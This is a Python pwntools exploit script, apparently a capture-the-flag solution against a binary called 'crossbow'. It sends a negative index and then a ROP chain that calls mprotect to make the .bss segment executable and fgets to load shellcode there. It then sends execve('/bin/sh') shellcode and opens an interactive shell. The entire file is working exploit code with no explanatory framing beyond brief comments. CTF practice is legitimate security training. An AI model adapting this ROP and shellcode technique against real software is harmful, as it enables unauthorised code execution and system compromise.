from pwn import *

gdbscript = '''
break *0x4013ea
break *0x000000000040136c
break main
break fgets
'''
#context.log_level = "debug"
elf = ELF("./crossbow")
r = gdb.debug("./crossbow", gdbscript = gdbscript)

r.sendlineafter(b"to shoot: ",b"-2")


rop = ROP(elf)
payload = b'a'*8

'''
payload structure => 
mprotect(.bss, 0x1000, rwx) -> rdi rsi rdx
fgets(.bss, 0x100, 9)

stack  rop 
	|
	v
pop rdi
.bss addr
pop rsi
0x1000
pop rdx
7
call mprotect

pop rdi
.bss
pop rsi
0x100
pop rdx
9
call fgets

call .bss
'''
payload += p64(rop.rdi[0])
payload += p64(elf.bss())
payload += p64(rop.rsi[0])
payload += p64(0x1000)
payload += p64(rop.rdx[0])
payload += p64(7)
payload += p64(elf.symbols.mprotect)

payload += p64(rop.rdi[0])
payload += p64(0x40E300)
payload += p64(rop.rsi[0])
payload += p64(0x100)
payload += p64(rop.rdx[0])
payload += p64(elf.symbols.__stdin_FILE)
payload += p64(elf.symbols.fgets)
payload += p64(0x40E300+1)


r.sendafter(b"warcry!!", payload)

payload2 = asm('''
	mov rax, 0x68732f6e69622f
	push rax
	push rsp
	pop rdi
	xor eax, eax
	push rax
	mov al, 59
	push rsp
	pop rdx
	push rsp
	pop rsi
	syscall
''',arch = 'amd64', os = 'linux')
r.sendline(payload2)

r.interactive()
